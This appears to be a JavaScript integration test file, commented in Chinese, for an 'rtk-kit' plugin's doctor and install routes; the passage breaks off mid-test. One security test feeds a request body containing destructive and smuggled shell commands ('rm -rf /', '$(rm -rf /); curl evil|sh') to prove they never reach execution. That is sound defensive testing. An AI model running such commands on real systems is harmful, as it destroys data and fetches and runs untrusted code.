// test/integration.test.mjs —— integration 形测试（假 ctx 真 apply + 真 handler 执行，INV-8 测试红线）
// 契约面：changes/20260929-phase0/tasks.md Task 6 测试契约（注册形 / 鉴权 / 三端点 / 超时失败 / 拆除幂等 / 零真实 rtk）。
// 测试红线（INV-4）：全程注入假 execFile——零真实 rtk 执行、零 node:child_process 直引；
//   「真 apply」用 enabled:false 短路 probeRtk（装载期零 spawn），三动作经注入缝走假执行器。
import test from 'node:test'
import assert from 'node:assert/strict'
import crypto from 'node:crypto'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { Config, apply, buildDoctorTool } from '../lib/index.js'
import { API_PREFIX, INSTALL_ERROR_STATUS, INSTALL_URL, registerDoctorRoutes } from '../lib/doctor-routes.js'
import { HEALTH_ITEMS, INSTALL_HINT } from '../lib/doctor.js'
import { CHECKSUMS_ASSET, RTK_ASSET, defaultFs, releaseAssetUrl } from '../lib/install.js'

// ───────────────────────── fixtures ─────────────────────────

/** 记录调用形的假 execFile（执行器注入缝）。 */
function fakeExec(impl) {
  const calls = []
  const exec = async (file, args, opts) => {
    calls.push({ file, args, opts })
    return impl(file, args, opts)
  }
  return { exec, calls }
}

/** 模拟 execFile 超时被 SIGTERM 杀死的 reject 形（不真等 5 秒）。 */
function timeoutError() {
  const e = new Error('Command failed: rtk')
  e.killed = true
  e.signal = 'SIGTERM'
  e.code = null
  return e
}

/** 模拟二进制缺失的 spawn 级失败（ENOENT）。 */
function enoentError() {
  const e = new Error('spawn rtk ENOENT')
  e.code = 'ENOENT'
  return e
}

/** 假 ctx（webServer.register 捕获 / connection.requestRejection / tools.register 捕获 / shell.resolve / effect / on / logger）。 */
function makeCtx({ rejection } = {}) {
  const registered = []
  const effects = []
  const toolCalls = []
  const onCalls = []
  const rejectionCalls = []
  const warnings = []
  return {
    registered,
    effects,
    toolCalls,
    onCalls,
    rejectionCalls,
    warnings,
    webServer: {
      register(spec) {
        registered.push(spec)
        const counter = { count: 0 }
        spec.disposeCalls = counter
        return () => {
          counter.count += 1
        }
      },
    },
    connection: {
      requestRejection(arg) {
        rejectionCalls.push(arg)
        return typeof rejection === 'function' ? rejection(arg) : rejection
      },
    },
    tools: { register(...a) {
      toolCalls.push(a)
    } },
    shell: { resolve: (request) => request },
    effect(fn) {
      effects.push(fn)
    },
    on(...a) {
      onCalls.push(a)
    },
    logger: {
      warn: (m) => warnings.push(String(m)),
      info() {},
      error() {},
    },
  }
}

/** 假 req（body 走 async iterator；reads 记录是否被消费——INV-7 证明 body 不进任何处理路径）。 */
function makeReq({ url = `${API_PREFIX}/version`, method = 'GET', headers = { 'x-test': '1' }, body = null } = {}) {
  const reads = { count: 0 }
  return {
    url,
    method,
    headers,
    reads,
    async *[Symbol.asyncIterator]() {
      reads.count += 1
      if (body != null) yield Buffer.from(String(body))
    },
  }
}

/** 假 res（捕获 writeHead/setHeader/end 落点）。 */
function makeRes() {
  const res = {
    status: null,
    headers: {},
    raw: null,
    body: null,
    writeHead(status, headers) {
      res.status = status
      Object.assign(res.headers, headers ?? {})
      return res
    },
    setHeader(k, v) {
      res.headers[k] = v
    },
    end(data) {
      res.raw = data == null ? null : String(data)
      res.body = res.raw == null ? null : JSON.parse(res.raw)
      return res
    },
  }
  return res
}

/** 注册真路由并拿到真 handler（经 webServer.register 捕获面执行，非绕过注册直调）。
 *  Task 2 默认注入（同步修 fixture）：记录面落点 mkdtemp（version 面 lastInstall 读取也零真 home）+
 *  平台判定 linux/x64（installSupported 确定性；T1 optsFor 同口径）。 */
function routesWith(opts = {}, ctxOpts = {}) {
  const ctx = makeCtx(ctxOpts)
  const defaults = {
    installOpts: { logPath: path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'rtk-routes-')), 'install-log.json') },
    platform: 'linux',
    arch: 'x64',
  }
  const dispose = registerDoctorRoutes(ctx, { ...defaults, ...opts })
  const spec = ctx.registered[0]
  return {
    ctx,
    spec,
    dispose,
    async call(req) {
      const res = makeRes()
      await spec.handler(req, res)
      return res
    },
  }
}

/** 行为面白名单断言（INV-7）：执行器只见过三个固定 argv 形，零拼接零旗标。 */
const SAFE_ARGV = new Set(['--version', 'gain,-a,-f,json', 'rewrite,git status'])
function assertSafeArgv(calls) {
  for (const { file, args } of calls) {
    assert.ok(typeof file === 'string' && file.length > 0, 'rtkBin 必须是非空字符串')
    assert.ok(SAFE_ARGV.has(args.join(',')), `argv 越出白名单：${JSON.stringify(args)}`)
    assert.ok(args.every((s) => !s.includes('--reset')), '零破坏性旗标')
    assert.ok(!args.includes('run'), '零透传执行子命令')
    assert.ok(args.every((s) => !/[\n;|&$`]/.test(s)), '零 shell 元字符拼接')
  }
}

const SOURCE = fs.readFileSync(new URL('../lib/doctor-routes.js', import.meta.url), 'utf8')

// ───────────────────────── 注册面 ─────────────────────────

test('注册形：假 ctx 真 apply + registerDoctorRoutes → {kind:"prefix", path:"/api/rtk-kit"}', () => {
  const ctx = makeCtx()
  apply(ctx, { enabled: false, registerDoctorTool: false, awareness: 'off' }) // 真 apply（enabled:false 零 spawn）
  registerDoctorRoutes(ctx, {})
  assert.equal(ctx.registered.length, 1)
  const spec = ctx.registered[0]
  assert.equal(spec.kind, 'prefix')
  assert.equal(spec.path, '/api/rtk-kit')
  assert.equal(spec.path, API_PREFIX)
  assert.equal(typeof spec.handler, 'function')
})

test('拆除幂等（INV-8）：ctx.effect 收集的 disposer 两次不抛；底层 register disposer 恰一次', () => {
  const { exec } = fakeExec(async () => ({ code: 0, stdout: 'rtk 0.49.0', stderr: '' }))
  const ctx = makeCtx()
  apply(ctx, { enabled: false, registerDoctorTool: false, awareness: 'off' })
  const dispose = registerDoctorRoutes(ctx, { exec })
  ctx.effect(dispose) // Task 8 接线形：disposer 交 ctx.effect 收敛
  assert.ok(ctx.effects.length >= 2)
  for (const fn of ctx.effects) {
    assert.doesNotThrow(() => fn())
    assert.doesNotThrow(() => fn()) // 两次不抛
  }
  assert.equal(ctx.registered[0].disposeCalls.count, 1) // 幂等：底层 disposer 只真执行一次
})

// ───────────────────────── 鉴权（INV-9） ─────────────────────────

test('鉴权（INV-9）：requestRejection 回 401/403 → 直接回拒不进业务面（假 execFile 零调用）', async () => {
  for (const rejection of [401, 403]) {
    for (const [url, method] of [
      [`${API_PREFIX}/version`, 'GET'],
      [`${API_PREFIX}/gain`, 'GET'],
      [`${API_PREFIX}/health`, 'POST'],
      [`${API_PREFIX}/nope`, 'GET'],
    ]) {
      const { exec, calls } = fakeExec(async () => ({ code: 0, stdout: 'rtk 0.49.0', stderr: '' }))
      const r = routesWith({ exec }, { rejection })
      const req = makeReq({ url, method, body: method === 'POST' ? '{}' : null })
      const res = await r.call(req)
      assert.equal(res.status, rejection, `${method} ${url} 应 ${rejection}`)
      assert.equal(res.body.error.code, 'AUTH_REQUIRED')
      assert.equal(typeof res.body.error.message, 'string')
      assert.equal(calls.length, 0, `${method} ${url} 未过鉴权不得进业务面（exec 零调用）`)
      assert.equal(r.ctx.rejectionCalls.length, 1)
      assert.deepEqual(r.ctx.rejectionCalls[0], { headers: req.headers }) // requestRejection({headers}) 缝形
    }
  }
})

test('鉴权（INV-9）：requestRejection 回 undefined → 业务面可达', async () => {
  const { exec } = fakeExec(async () => ({ code: 0, stdout: 'rtk 0.49.0\n', stderr: '' }))
  const r = routesWith({ exec }, { rejection: undefined })
  const res = await r.call(makeReq({ url: `${API_PREFIX}/version` }))
  assert.equal(res.status, 200)
  assert.equal(res.body.data.available, true)
})

// ───────────────────────── 三端点（US-2 / US-3 / INV-3 / INV-5） ─────────────────────────

test('GET version：成功 {data}（版本号+路径+可用性+lastInstall/installSupported/installTargetMatch；path=每请求重发现实际执行值，F-FINAL-1(i) 口径）', async () => {
  const { exec, calls } = fakeExec(async () => ({ code: 0, stdout: 'rtk 0.49.0\n', stderr: '' }))
  const r = routesWith({ exec, rtkBin: '/opt/rtk/bin/rtk', resolveEnv: { path: '', homedir: '', isExecutable: () => false } }, { rejection: undefined })
  const res = await r.call(makeReq({ url: `${API_PREFIX}/version` }))
  assert.equal(res.status, 200)
  // Task 2 数据面（Ruling 2）：data 增 lastInstall（最近记录或 null）+ installSupported（服务端平台判定）
  // + installTargetMatch（F-FINAL-1(ii)：种子=/opt/rtk/bin/rtk 显式路径缺失且≠默认落点 → false）
  assert.deepEqual(res.body.data, {
    available: true,
    version: '0.49.0',
    path: '/opt/rtk/bin/rtk',
    hint: null,
    lastInstall: null,
    installSupported: true,
    installTargetMatch: false,
  })
  assert.deepEqual(calls[0].args, ['--version']) // 路由只走三动作白名单（M1 结案口径）
  assert.equal(calls[0].file, '/opt/rtk/bin/rtk')
})

test('GET version：rtk 缺失软回 {data:{available:false,version:null,path,hint}}（版本区显示安装提示，不抛 500）', async () => {
  const { exec } = fakeExec(async () => {
    throw enoentError()
  })
  // F-02 注入（同步修 fixture）：全缺失解析缝——断言原文（hint=INSTALL_HINT）不动，摆脱真机 rtk 干扰
  const r = routesWith({ exec, rtkBin: 'rtk', resolveEnv: { path: '', homedir: '', isExecutable: () => false } }, { rejection: undefined })
  const res = await r.call(makeReq({ url: `${API_PREFIX}/version` }))
  assert.equal(res.status, 200)
  assert.deepEqual(res.body.data, {
    available: false,
    version: null,
    path: 'rtk',
    hint: INSTALL_HINT,
    lastInstall: null,
    installSupported: true,
    installTargetMatch: true, // 裸名种子：A2 发现可被引擎落点满足（F-FINAL-1(ii) 门控三条件不齐）
  })
})

test('GET gain：成功 {data}（summary 指标对象 + 日/周/月周期序列，-a 一次取全量）', async () => {
  const payload = {
    summary: { total_commands: 42, total_input: 100, total_output: 200, total_saved: 50, avg_savings_pct: 12.5, total_time_ms: 900, avg_time_ms: 21 },
    daily: [{ date: '2026-09-29', commands: 3, savings_pct: 10 }],
    weekly: [{ week_start: '2026-09-23', week_end: '2026-09-29', commands: 9 }],
    monthly: [{ month: '2026-09', commands: 40 }],
  }
  const { exec, calls } = fakeExec(async () => ({ code: 0, stdout: JSON.stringify(payload), stderr: '' }))
  const r = routesWith({ exec, rtkBin: '/opt/rtk/bin/rtk' }, { rejection: undefined })
  const res = await r.call(makeReq({ url: `${API_PREFIX}/gain` }))
  assert.equal(res.status, 200)
  assert.equal(res.body.data.summary.total_commands, 42)
  assert.equal(res.body.data.daily[0].date, '2026-09-29')
  assert.equal(res.body.data.weekly[0].week_start, '2026-09-23')
  assert.equal(res.body.data.monthly[0].month, '2026-09')
  assert.deepEqual(calls[0].args, ['gain', '-a', '-f', 'json'])
})

test('GET gain：输出解析失败 → {error:{code:"RTK_ERROR"}}（US-4）', async () => {
  const { exec } = fakeExec(async () => ({ code: 0, stdout: 'not json at all', stderr: '' }))
  const r = routesWith({ exec }, { rejection: undefined })
  const res = await r.call(makeReq({ url: `${API_PREFIX}/gain` }))
  assert.equal(res.status, 500)
  assert.equal(res.body.error.code, 'RTK_ERROR')
  assert.equal(typeof res.body.error.message, 'string')
})

test('GET gain：rtk 缺失（ENOENT）→ {error:{code:"RTK_UNAVAILABLE"}} + 安装提示字段（fail-open，不抛 500 不炸装载）', async () => {
  const { exec } = fakeExec(async () => {
    throw enoentError()
  })
  // F-02 注入（同步修 fixture）：全缺失解析缝——真缺失才带安装提示（hint 与 found 同门控）
  const r = routesWith({ exec, resolveEnv: { path: '', homedir: '', isExecutable: () => false } }, { rejection: undefined })
  const res = await r.call(makeReq({ url: `${API_PREFIX}/gain` }))
  assert.equal(res.status, 503)
  assert.equal(res.body.error.code, 'RTK_UNAVAILABLE')
  assert.equal(res.body.error.hint, INSTALL_HINT)
})

test('超时（INV-5/US-4）：version/gain 超时 reject → {error:{code:"RTK_TIMEOUT"}} 供 UI 重试', async () => {
  for (const path of ['version', 'gain']) {
    const { exec } = fakeExec(async () => {
      throw timeoutError()
    })
    const r = routesWith({ exec }, { rejection: undefined })
    const res = await r.call(makeReq({ url: `${API_PREFIX}/${path}` }))
    assert.equal(res.status, 504, path)
    assert.equal(res.body.error.code, 'RTK_TIMEOUT', path)
    assert.equal(typeof res.body.error.message, 'string', path)
  }
})

// ───────────────────────── 健康面（INV-4 零污染 / fail-open） ─────────────────────────

test('POST health：{data} 七项定序 {id,label,status,detail}（proposal §4 健康=七项结果数组）', async () => {
  const { exec, calls } = fakeExec(async (file, args) => {
    const key = args.join(',')
    if (key === '--version') return { code: 0, stdout: 'rtk 0.49.0\n', stderr: '' }
    if (key === 'gain,-a,-f,json') return { code: 0, stdout: JSON.stringify({ summary: { total_commands: 7 } }), stderr: '' }
    return { code: 3, stdout: 'rtk git status', stderr: '' }
  })
  const historyReader = async ({ since } = {}) => {
    assert.equal(typeof since, 'string') // 压缩检查给 30 天窗口
    return { count: 10, avgSavingsPct: 25 }
  }
  const r = routesWith({ exec, rtkBin: 'rtk', historyReader }, { rejection: undefined })
  const res = await r.call(makeReq({ url: `${API_PREFIX}/health`, method: 'POST', body: '{}' }))
  assert.equal(res.status, 200)
  assert.ok(Array.isArray(res.body.data))
  assert.equal(res.body.data.length, 7)
  assert.deepEqual(res.body.data.map((i) => i.id), HEALTH_ITEMS.map((i) => i.id)) // 定序
  for (const [i, item] of res.body.data.entries()) {
    assert.equal(item.label, HEALTH_ITEMS[i].label)
    assert.ok(item.status === 'pass' || item.status === 'fail')
    assert.equal(typeof item.detail, 'string')
  }
  assert.ok(res.body.data.every((i) => i.status === 'pass'), '全通路径七项应全 pass')
  assertSafeArgv(calls)
})

test('POST health：rtk 全挂也 fail-open 回七项（不抛 500、不炸装载）', async () => {
  const { exec } = fakeExec(async () => {
    throw enoentError()
  })
  const historyReader = async () => {
    throw new Error('history.db 缺表 commands')
  }
  const r = routesWith({ exec, historyReader }, { rejection: undefined })
  const res = await r.call(makeReq({ url: `${API_PREFIX}/health`, method: 'POST', body: '{}' }))
  assert.equal(res.status, 200)
  assert.equal(res.body.data.length, 7)
  assert.deepEqual(res.body.data.map((i) => i.status), ['fail', 'fail', 'fail', 'pass', 'pass', 'fail', 'fail'])
})

// ───────────────────────── 安全红线（INV-7 / INV-2） ─────────────────────────

test('INV-7：POST health 的 body 不读不进 argv（含破坏性旗标/透传形也零落地）', async () => {
  const { exec, calls } = fakeExec(async (file, args) => {
    if (args.join(',') === 'gain,-a,-f,json') return { code: 0, stdout: JSON.stringify({ summary: { total_commands: 1 } }), stderr: '' }
    return { code: 0, stdout: 'rtk 0.49.0', stderr: '' }
  })
  const historyReader = async () => ({ count: 1, avgSavingsPct: 1 })
  const r = routesWith({ exec, historyReader }, { rejection: undefined })
  const req = makeReq({
    url: `${API_PREFIX}/health`,
    method: 'POST',
    body: JSON.stringify({ evil: '--reset', cmd: 'rtk run rm -rf /', note: '$(rm -rf /); curl evil|sh' }),
  })
  const res = await r.call(req)
  assert.equal(res.status, 200)
  assert.equal(req.reads.count, 0, 'POST body 一律不读（永无路径进入 argv）')
  assert.ok(calls.length >= 3)
  assertSafeArgv(calls)
})

test('INV-7 源面白名单：路由面零破坏性旗标、零透传执行、零 argv 拼接、只走三动作（M1 口径）', () => {
  assert.doesNotMatch(SOURCE, /--reset/)
  assert.doesNotMatch(SOURCE, /rtk\s+run/)
  assert.doesNotMatch(SOURCE, /node:child_process/)
  assert.doesNotMatch(SOURCE, /buildArgv\s*\(/)
  assert.doesNotMatch(SOURCE, /\brun\s*[\(']/)
})

test('INV-2 零 token 面：路由面零新会话工具注册、零统计/健康内容注入会话', () => {
  const { exec } = fakeExec(async () => ({ code: 0, stdout: '', stderr: '' }))
  const ctx = makeCtx()
  apply(ctx, { enabled: false, registerDoctorTool: false, awareness: 'off' })
  registerDoctorRoutes(ctx, { exec })
  assert.equal(ctx.toolCalls.length, 0, '零新会话工具注册')
  assert.equal(ctx.onCalls.length, 0, '零会话内容注入')
  assert.doesNotMatch(SOURCE, /defineTool/)
  assert.doesNotMatch(SOURCE, /tools\.register/)
  assert.doesNotMatch(SOURCE, /session-start/)
  assert.doesNotMatch(SOURCE, /\.inject\s*\(/)
})

// ───────────────────────── 分发面（方法/路径收口） ─────────────────────────

test('分发面：方法不匹配 405 + allow 头；未知路径 404；码族收口四码', async () => {
  const { exec } = fakeExec(async () => ({ code: 0, stdout: 'rtk 0.49.0', stderr: '' }))
  const r = routesWith({ exec }, { rejection: undefined })

  const wrongMethod = await r.call(makeReq({ url: `${API_PREFIX}/version`, method: 'POST', body: '{}' }))
  assert.equal(wrongMethod.status, 405)
  assert.equal(wrongMethod.headers.allow, 'GET')
  assert.equal(wrongMethod.body.error.code, 'RTK_ERROR')

  const wrongHealthMethod = await r.call(makeReq({ url: `${API_PREFIX}/health`, method: 'GET' }))
  assert.equal(wrongHealthMethod.status, 405)
  assert.equal(wrongHealthMethod.headers.allow, 'POST')

  const unknown = await r.call(makeReq({ url: `${API_PREFIX}/nope` }))
  assert.equal(unknown.status, 404)
  assert.equal(unknown.body.error.code, 'RTK_ERROR')

  for (const res of [wrongMethod, wrongHealthMethod, unknown]) {
    assert.ok(['AUTH_REQUIRED', 'RTK_UNAVAILABLE', 'RTK_TIMEOUT', 'RTK_ERROR'].includes(res.body.error.code))
    assert.equal(typeof res.body.error.message, 'string')
    assert.ok(!('data' in res.body), '失败信封不得混入 data')
  }
})

// ───────────────────────── Task 8：doctor 瘦身（INV-6） ─────────────────────────

test('INV-6 doctor 瘦身：gain 段受 config.doctorGain && args.gain!==false 门控，缺省不输出', async () => {
  // 真 apply 注册面：唯一会话工具仍为 rtk_doctor（零新增 defineTool），参数 description 同步 default false
  const ctx = makeCtx()
  apply(ctx, { enabled: false, registerDoctorTool: true, awareness: 'off', doctorGain: false })
  assert.equal(ctx.toolCalls.length, 1)
  const tool = ctx.toolCalls[0][0]
  assert.equal(tool.name, 'rtk_doctor')
  // defineTool 归一为 JSON Schema 形（模型可见面）
  assert.equal(tool.parameters.type, 'object')
  assert.match(tool.parameters.properties.gain.description, /default false/)

  const { exec, calls } = fakeExec(async (file, args) => {
    if (args.join(',') === '--version') return { code: 0, stdout: 'rtk 0.49.0\n', stderr: '' }
    return { code: 0, stdout: JSON.stringify({ summary: { total_commands: 7 } }), stderr: '' }
  })
  // R-03/R-04：全缺失解析注入缝（显式空 PATH + 显式空 home + 恒否判定）——零真机探测、输出确定
  const base = { rtkBin: 'rtk', exec, resolveEnv: { path: '', homedir: '', isExecutable: () => false } }
  // doctorGain 缺省 false：args.gain=true 也不输出（config 门控优先）
  const r1 = await buildDoctorTool(base).execute({ gain: true })
  assert.doesNotMatch(r1.text, /rtk gain/)
  // doctorGain:true → 含 gain 段
  const r2 = await buildDoctorTool({ ...base, doctorGain: true }).execute({})
  assert.match(r2.text, /--- rtk gain/)
  assert.match(r2.text, /total_commands/)
  // doctorGain:true 但 args.gain===false → 不输出
  const r3 = await buildDoctorTool({ ...base, doctorGain: true }).execute({ gain: false })
  assert.doesNotMatch(r3.text, /rtk gain/)
  // 双缺省 → 不输出（缺省口径）
  const r4 = await buildDoctorTool(base).execute({})
  assert.doesNotMatch(r4.text, /rtk gain/)
  assertSafeArgv(calls) // doctor 工具动作走 doctor.js 白名单（INV-7）
})

test('INV-2/INV-7 源面（index.js）：defineTool 调用恰一处（既有 rtk_doctor 瘦身复用）、零破坏性旗标暴露', () => {
  const INDEX = fs.readFileSync(new URL('../lib/index.js', import.meta.url), 'utf8')
  assert.equal(INDEX.match(/\bdefineTool\s*\(/g)?.length ?? 0, 1, '零新增 defineTool（唯一会话工具仍 rtk_doctor）')
  assert.doesNotMatch(INDEX, /--reset/)
  assert.doesNotMatch(INDEX, /spawnSync\([^)]*['"]run['"]/)
})

// ───────────────────────── Task 8：接线面（fail-open / 工厂形 effect） ─────────────────────────

test('fail-open（INV-8）：缺 webServer/connection 缝的假 ctx → apply 不抛、留痕恰一、resolve 改写缝仍工作', () => {
  const warnings = []
  const effects = []
  const orig = (request) => request
  const bare = {
    shell: { resolve: orig },
    tools: { register() {} },
    effect(fn, label) {
      effects.push({ fn, label })
    },
    on() {},
    logger: { warn: (m) => warnings.push(String(m)) },
  }
  apply(bare, { enabled: false, registerDoctorTool: false, awareness: 'off' })
  assert.equal(warnings.length, 1, '缺缝留痕恰一（fail-open 不炸装载）')
  assert.match(warnings[0], /webServer\/connection 服务缝(缺失|半缺)/)
  // resolve 改写缝仍工作：包壳在位 + enabled:false 恒等放行（零 spawn）
  assert.notEqual(bare.shell.resolve, orig, 'resolve 缝包壳仍在')
  const req = { command: 'git status', stdin: null }
  assert.deepEqual(bare.shell.resolve(req), req)
  // 工厂形 effect（队长硬约束）：body 当场跑、返回函数才是拆除器；拆除后还原
  assert.equal(effects.length, 1)
  const wrapped = bare.shell.resolve
  const dispose = effects[0].fn()
  assert.equal(typeof dispose, 'function', '工厂形：返回函数才是拆除器')
  assert.equal(bare.shell.resolve, wrapped, '拆除前包壳仍在（工厂当场跑不还原）')
  dispose()
  assert.notEqual(bare.shell.resolve, wrapped, '拆除后包壳卸下（还原 resolve）')
  assert.deepEqual(bare.shell.resolve(req), req, '还原后恒等形')
  assert.doesNotThrow(() => dispose()) // 拆除幂等
})

test('接线正路径：假 ctx 带 webServer/connection + ctx.plugin 子插件形 → prefix 注册 + 工厂形 effect 拆除', () => {
  const ctx = makeCtx()
  const pluginCalls = []
  ctx.plugin = (spec) => {
    pluginCalls.push(spec)
  }
  apply(ctx, { enabled: false, registerDoctorTool: false, awareness: 'off' })
  assert.equal(pluginCalls.length, 1, '数据面走 ctx.plugin 子插件形接线')
  const spec = pluginCalls[0]
  assert.deepEqual(spec.inject, ['webServer', 'connection'])
  // 模拟宿主：子插件 ctx 拿到两缝后跑 apply（注册动作在 effect 执行体内当场跑）
  const effects = []
  const sub = {
    ...ctx,
    effect(fn, label) {
      effects.push({ fn, label })
    },
  }
  spec.apply(sub)
  assert.equal(effects.length, 1)
  assert.equal(effects[0].label, 'rtk-kit: doctor-routes')
  const dispose = effects[0].fn() // 工厂当场跑 → 返回拆除器
  assert.equal(typeof dispose, 'function')
  assert.equal(ctx.registered.length, 1)
  assert.equal(ctx.registered[0].kind, 'prefix')
  assert.equal(ctx.registered[0].path, '/api/rtk-kit')
  dispose()
  dispose() // 拆除幂等
  assert.equal(ctx.registered[0].disposeCalls.count, 1)
})

// ───────────────────────── Task 8：T6 审查 deferred 项收口（F1/F2） ─────────────────────────

test('F1：opts.connection 不得遮蔽 ctx.connection 鉴权缝（展开序 {...opts, connection, warn}）', async () => {
  const { exec } = fakeExec(async () => ({ code: 0, stdout: 'rtk 0.49.0\n', stderr: '' }))
  const bogusCalls = []
  const bogus = {
    requestRejection(arg) {
      bogusCalls.push(arg)
      return 403
    },
  }
  const r = routesWith({ exec, connection: bogus }, { rejection: undefined })
  const res = await r.call(makeReq({ url: `${API_PREFIX}/version` }))
  assert.equal(res.status, 200, '鉴权缝必须走 ctx.connection（rejection: undefined=放行）')
  assert.equal(r.ctx.rejectionCalls.length, 1)
  assert.equal(bogusCalls.length, 0, 'opts.connection 不得被调用（不得遮蔽缝）')
})

test('F2：鉴权缝抛错 → dispatch 外层兜底回错误信封（绝不 unhandled rejection）', async () => {
  const throwing = () => {
    throw new Error('鉴权缝炸了')
  }
  for (const [url, method] of [
    [`${API_PREFIX}/version`, 'GET'], // handler 内 authGate 抛（异步拒绝）
    [`${API_PREFIX}/nope`, 'GET'], // 分发面 authGate 抛（同步）
  ]) {
    const { exec } = fakeExec(async () => ({ code: 0, stdout: '', stderr: '' }))
    const r = routesWith({ exec }, { rejection: throwing })
    const res = await r.call(makeReq({ url, method }))
    assert.equal(res.status, 500, `${url} 应回错误信封`)
    assert.equal(res.body.error.code, 'RTK_ERROR')
    assert.equal(typeof res.body.error.message, 'string')
    assert.ok(!('data' in res.body), '失败信封不得混入 data')
  }
})

// ───────────────────────── Task 3：真 apply() 安装面接线（引擎注入 / fail-open / 红线锁） ─────────────────────────
// 契约面：changes/2026-10-03-rtk-reinstall/tasks.md Task 3（US-2 / INV-1 / INV-4）+ 跨卡契约（Task 2 复审逐字口径）。
// 测试红线：假 ctx 真 apply + 真 handler 执行（AGENTS.md integration 形）；安装引擎 IO 全假注入（fetch/exec/fs）；
//   hermetic 双保险（$HOME→mkdtemp root + globalThis.fetch 恒抛）保证红绿两态都零真 home 写入、零真实网络。

const FIXED_MS = 1770000000000
const FIXED_ISO = new Date(FIXED_MS).toISOString()
const sha256Hex = (b) => crypto.createHash('sha256').update(b).digest('hex')
const INDEX_SOURCE = fs.readFileSync(new URL('../lib/index.js', import.meta.url), 'utf8')

function checksumsText(pairs) {
  return `${pairs.map(([name, buf]) => `${sha256Hex(buf)}  ${name}`).join('\n')}\n`
}

/** 真 home/网络双保险：$HOME→mkdtemp root（os.homedir() 随之收口）+ globalThis.fetch 恒抛（禁真实网络）。 */
async function hermetic(root, fn) {
  const prevHome = process.env.HOME
  const prevFetch = globalThis.fetch
  process.env.HOME = root
  globalThis.fetch = async (url) => {
    throw new Error(`测试红线：禁止真实网络调用 ${String(url)}`)
  }
  try {
    return await fn()
  } finally {
    if (prevHome === undefined) delete process.env.HOME
    else process.env.HOME = prevHome
    globalThis.fetch = prevFetch
  }
}

/** 真 apply() 接线缝：外层 apply(ctx, config, deps) → ctx.plugin 子插件 → effect 工厂 → registerDoctorRoutes 真注册。 */
function applyWiring({ deps = {}, rejection, config = {}, subTweak } = {}) {
  const ctx = makeCtx({ rejection })
  const origResolve = ctx.shell.resolve
  const pluginCalls = []
  ctx.plugin = (spec) => pluginCalls.push(spec)
  apply(ctx, { enabled: false, registerDoctorTool: false, awareness: 'off', rtkBin: '/opt/fake/bin/rtk', ...config }, deps)
  assert.equal(pluginCalls.length, 1, '数据面走 ctx.plugin 子插件形接线')
  const spec = pluginCalls[0]
  const subEffects = []
  const sub = { ...ctx, effect(fn, label) { subEffects.push({ fn, label }) } }
  if (subTweak) subTweak(sub)
  spec.apply(sub) // 宿主形：子插件 ctx 拿到 webServer/connection 后跑 apply（注册动作在 effect 执行体内当场跑）
  return {
    ctx,
    origResolve,
    sub,
    routeSpec: () => ctx.registered[0],
    run: () => subEffects[0].fn(), // 工厂当场跑 → 返回拆除器（或 fail-open noop）
  }
}

/** 经真注册 handler 执行（非绕过注册直调）。 */
async function callSpec(spec, req) {
  const res = makeRes()
  await spec.handler(req, res)
  return res
}

/** 假 fetch（内存 Response；URL 只可能是两条固定白名单资产地址）。 */
function fakeFetch(sums, tgz, calls = []) {
  return async (url) => {
    calls.push(String(url))
    return new Response(String(url) === releaseAssetUrl(CHECKSUMS_ASSET) ? sums : tgz)
  }
}

/** 假 exec：tar 解包模拟（只产白名单条目 rtk）+ 复检 --version；零真实子进程、零真实 rtk。 */
function fakeInstallExec(newBytes, calls = []) {
  return async (file, args) => {
    calls.push({ file, args })
    const key = args.join(',')
    if (file === 'tar' && args[0] === '-xzf' && args[2] === '-C') {
      fs.mkdirSync(args[3], { recursive: true })
      const picked = path.join(args[3], 'rtk')
      fs.writeFileSync(picked, newBytes)
      fs.chmodSync(picked, 0o755)
      return { code: 0, stdout: '', stderr: '' }
    }
    if (key === '--version') return { code: 0, stdout: 'rtk 9.9.9\n', stderr: '' }
    throw new Error(`假 exec 未预期调用：${file} ${key}`)
  }
}

/** 记录型 fs 缝（默认 fs 真实现 + 全路径限 mkdtemp root 内 = 零真 home 机械锁）。 */
function confinedFs(root, record = []) {
  const wrapped = {}
  for (const key of Object.keys(defaultFs)) {
    wrapped[key] = (...args) => {
      record.push({ method: key, args })
      for (const a of args) {
        if (typeof a === 'string') {
          assert.ok(a === root || a.startsWith(root + path.sep), `fs.${key} 越出 mkdtemp root：${a}`)
        }
      }
      return defaultFs[key](...args)
    }
  }
  return wrapped
}

/** 引擎 stub 返回的成功结果（record/verify 形与 buildInstallRecord/getVersion 同口径）。 */
const STUB_OK = Object.freeze({
  ok: true,
  record: Object.freeze({ time: FIXED_ISO, version: '9.9.9', source: releaseAssetUrl(RTK_ASSET), ok: true, error: null }),
  verify: Object.freeze({ available: true, version: '9.9.9', path: '/opt/fake/bin/rtk', hint: null }),
})

test('Task 3 注册面：真 apply() 接线 → install 路由在注册面（与直注册同形）、方法面只 POST、拆除幂等', async () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'rtk-apply-reg-'))
  await hermetic(root, async () => {
    const engineCalls = []
    const w = applyWiring({
      rejection: undefined,
      deps: {
        logPath: path.join(root, 'install-log.json'),
        installDir: path.join(root, 'bin'),
        tmpdir: root,
        platform: 'linux',
        arch: 'x64',
        installEngine: async (opts) => {
          engineCalls.push(opts)
          return STUB_OK
        },
      },
    })
    const dispose = w.run()
    const spec = w.routeSpec()
    assert.equal(spec.kind, 'prefix')
    assert.equal(spec.path, API_PREFIX)
    assert.equal(spec.path, '/api/rtk-kit')
    assert.equal(typeof spec.handler, 'function')

    // 方法面只 POST：GET → 405 + allow 头（不进业务面）；POST → 过方法门（引擎被调，非 405）
    const getRes = await callSpec(spec, makeReq({ url: `${API_PREFIX}/install`, method: 'GET' }))
    assert.equal(getRes.status, 405)
    assert.equal(getRes.headers.allow, 'POST')
    assert.equal(getRes.body.error.code, 'RTK_ERROR')
    assert.equal(engineCalls.length, 0, 'GET 不得进业务面')

    const postReq = makeReq({ url: `${API_PREFIX}/install`, method: 'POST', body: '{"evil":"--reset"}' })
    const postRes = await callSpec(spec, postReq)
    assert.equal(postRes.status, 200)
    assert.deepEqual(Object.keys(postRes.body), ['data'], '成功信封恰 {data}')
    assert.deepEqual(Object.keys(postRes.body.data).sort(), ['record', 'verify'], '成功信封 data 恰 {record, verify}')
    assert.equal(postReq.reads.count, 0, 'POST body 一律不读（INV-7）')
    assert.equal(engineCalls.length, 1)

    // 引擎注入 opts（Task 3 apply() 契约）：rtkBin=每请求重发现值（种子=config 原值，F-FINAL-1(i)；本例显式
